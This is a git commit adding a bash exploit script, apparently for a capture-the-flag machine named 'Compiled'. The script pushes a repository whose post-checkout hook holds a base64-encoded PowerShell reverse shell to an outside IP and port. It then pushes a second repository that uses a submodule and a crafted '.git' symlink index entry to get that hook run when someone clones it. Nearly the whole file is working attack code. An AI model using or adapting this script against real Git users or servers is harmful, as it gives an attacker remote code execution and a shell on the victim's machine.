ecb9e97488078b8783dc615a707221e653e3111b
Roli810 <117933354+Roli810@users.noreply.github.com>
2024-08-01 02:46:37 +0300

    Add files via upload

---
+++ compiled3.sh
@@ -0,0 +1,56 @@
+#!/bin/bash
+
+# Set Git configuration options
+git config --global protocol.file.allow always
+git config --global core.symlinks true
+# to avoid the warning message
+git config --global init.defaultBranch main 
+
+
+# Pre-created remote Gitea hook repository
+hook_repo_path="http://compiled.htb:3000/axura/hook.git"
+
+# Initialize the hook repository
+git clone "$hook_repo_path"
+cd hook
+mkdir -p y/hooks
+
+# Write the malicious code to a hook
+cat > y/hooks/post-checkout <<EOF
+#!/bin/bash
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+EOF
+
+# Make the hook executable: important
+chmod +x y/hooks/post-checkout
+
+git add y/hooks/post-checkout
+
+# Push the changes back to the Gitea repository
+git commit -m "post-checkout"
+git push
+
+# Leave hook repo
+cd ..
+
+# Pre-created remote Gitea captain repository
+captain_repo_path="http://compiled.htb:3000/axura/captain.git"
+
+# Initialize the captain repository & add submodule pointing to hook
+git clone "$captain_repo_path"
+cd captain
+git submodule add --name x/y "$hook_repo_path" A/modules/x
+git commit -m "add-submodule"
+
+# Create a symlink
+printf ".git" > dotgit.txt
+git hash-object -w --stdin < dotgit.txt > dot-git.hash
+printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+git update-index --index-info < index.info
+
+# Commit and push the changes back to the Gitea repository
+git commit -m "add-symlink"
+git push
+
+# Leave captain repo
+cd ..
